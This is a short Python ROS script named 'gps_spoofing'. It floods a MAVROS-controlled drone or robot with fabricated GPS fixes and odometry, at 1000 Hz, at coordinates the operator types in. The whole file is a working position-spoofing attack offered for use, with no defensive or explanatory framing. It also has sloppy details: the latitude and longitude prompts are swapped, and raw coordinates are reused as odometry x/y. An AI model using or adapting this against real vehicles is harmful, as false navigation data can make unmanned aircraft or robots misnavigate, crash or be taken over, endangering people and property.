#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import NavSatFix
from nav_msgs.msg import Odometry

global_message = NavSatFix()
local_message = Odometry()

global_publisher = rospy.Publisher('/mavros/global_position/global', NavSatFix, queue_size = 10)
local_publisher = rospy.Publisher('/mavros/global_position/local', Odometry, queue_size = 10)
rospy.init_node('gps_spoofing')
rate = rospy.Rate(1000)

longitude = input("Enter the latitude to be used for the spoofing: ")
latitude = input("Enter the longitude to be used for the spoofing: ")

# add entered position as latitute and longitude to the NavSatFix
global_message.longitude = float(longitude)
global_message.latitude = float(latitude)

# add entered position to the Odometry 
local_message.pose.pose.position.x = global_message.longitude
local_message.pose.pose.position.y = global_message.latitude

first_local = True 
first_global = True

def spoof_local():
    local_publisher.publish(local_message)
    global first_local
    if first_local:
        print("\nMessage with values is being spoofed to nav_msgs/Odometry")
        first_local = False

def spoof_global():
    global_publisher.publish(global_message)
    global first_global
    if first_global:
        print("\nMessage with values is being spoofed to sensor_msgs/NavSatFix")
        first_global = False

try:
    while not rospy.is_shutdown():
        spoof_local()
        spoof_global()
        rate.sleep()

except KeyboardInterrupt:
    pass
    print("\nSpoofing of the GPS has stopped.")